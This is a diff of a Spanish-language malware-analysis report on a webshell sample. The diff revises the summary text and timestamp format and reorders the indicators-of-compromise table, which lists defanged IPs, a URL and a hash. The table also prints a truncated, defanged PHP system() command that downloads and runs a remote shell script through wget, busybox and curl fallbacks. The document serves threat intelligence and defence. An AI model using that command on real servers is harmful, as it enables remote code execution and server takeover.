@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 5 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:51:31+00:00`
+- **Registrado:** `2026-08-09T19:51:31.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,11 +54,11 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.169.XXX | static_analysis |
-| ip | 45.153.34.XXX | static_analysis |
 | url | hxxp://45.153.34.XXX/rondo. | strings |
-| hash | 5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1 | static_analysis |
+| ip | 45.153.34.XXX | static_analysis |
+| ip | 190.179.169.XXX | static_analysis |
 | command | <?php system('(wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|cur | strings |
+| hash | 5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1 | static_analysis |
 | ip | 94.154.43.XXX | artifact_source |
 
 ## 🔎 Triage
